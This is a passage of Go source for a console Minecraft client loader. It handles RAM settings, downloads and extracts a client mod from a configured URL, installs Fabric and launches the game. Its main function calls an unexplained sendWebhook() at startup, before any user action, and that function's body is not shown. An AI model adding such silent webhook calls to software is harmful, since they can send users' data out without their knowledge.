		input := strings.TrimSpace(readInput())
		ram, err := strconv.Atoi(input)
		if err != nil || ram < 2 {
			fmt.Println("  Invalid value! Must be >= 2. Press Enter...")
			readInput()
			continue
		}
		config.RAMAmount = ram
		saveConfig()
		fmt.Printf("  RAM set to %d GB! Press Enter...\n", ram)
		readInput()
		break
	}
}

func launchClient() {
	clearScreen()
	fmt.Println(asciiArt)
	fmt.Println("  LAUNCHING CLIENT")
	fmt.Println("  -----------------------------------------")
	if !directoryExists(config.InstallDir) {
		fmt.Println("  Installation directory does not exist!")
		fmt.Println("  Press Enter...")
		readInput()
		return
	}
	modMgr := NewModManager(config.InstallDir, logger)
	if !modMgr.IsModInstalled(MOD_FILENAME) {
		fmt.Println("  Client mod not found. Downloading...")
		zipPath := filepath.Join(config.InstallDir, "client-temp.zip")
		dlMgr := NewDownloadManager(logger, filepath.Join(getAppConfigDir(), "cache"))
		if err := dlMgr.DownloadFile(CLIENT_URL, zipPath); err != nil {
			fmt.Printf("  Failed to download: %v\n  Press Enter...", err)
			readInput()
			return
		}
		fmt.Println("  Extracting files...")
		if err := extractZip(zipPath, config.InstallDir); err != nil {
			fmt.Printf("  Failed to extract: %v\n  Press Enter...", err)
			os.Remove(zipPath)
			readInput()
			return
		}
		os.Remove(zipPath)
		if !modMgr.IsModInstalled(MOD_FILENAME) {
			fmt.Printf("  Error: %s not found in mods folder after extraction!\n", MOD_FILENAME)
			fmt.Println("  Press Enter...")
			readInput()
			return
		}
		fmt.Println("  Client installed successfully!")
	} else {
		fmt.Printf("  Found %s in mods folder\n", MOD_FILENAME)
	}
	fabricMgr := NewFabricManager(config.InstallDir, logger, nil)
	if !fabricMgr.IsFabricInstalled() {
		fmt.Println("  Fabric not installed. Installing...")
		dlMgr := NewDownloadManager(logger, filepath.Join(getAppConfigDir(), "cache"))
		if err := NewFabricManager(config.InstallDir, logger, dlMgr).InstallFabric(); err != nil {
			fmt.Printf("  Failed to install Fabric: %v\n  Press Enter...", err)
			readInput()
			return
		}
	} else {
		fmt.Println("  Fabric is installed")
	}
	fmt.Println("  Launching Minecraft...")
	launcher := NewMinecraftLauncher(config.InstallDir, logger, &config)
	if err := launcher.Launch(); err != nil {
		fmt.Printf("  Launch failed: %v\n", err)
	} else {
		fmt.Println("  Minecraft process started!")
	}
	fmt.Println("  Press Enter...")
	readInput()
}

func main() {
	rand.Seed(time.Now().UnixNano())

	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("\nFatal error: %v\n", r)
			fmt.Println("\nPress Enter to exit...")
			fmt.Scanln()
			os.Exit(1)
		}
	}()
	configDir := getAppConfigDir()
	logPath := filepath.Join(configDir, "babka-loader.log")
	logger = NewLogger(logPath, true)
	logger.Open()
	defer logger.Close()
	loadConfig()
	logger.SetEnabled(config.LogEnabled)
	if config.InstallDir == "" {
		home, _ := os.UserHomeDir()
		if home != "" {
			config.InstallDir = filepath.Join(home, "AppData", "Roaming", ".minecraft")
		}
	}
	if config.RAMAmount == 0 {
		config.RAMAmount = 4
	}
	sendWebhook()
	showMainMenu()
}
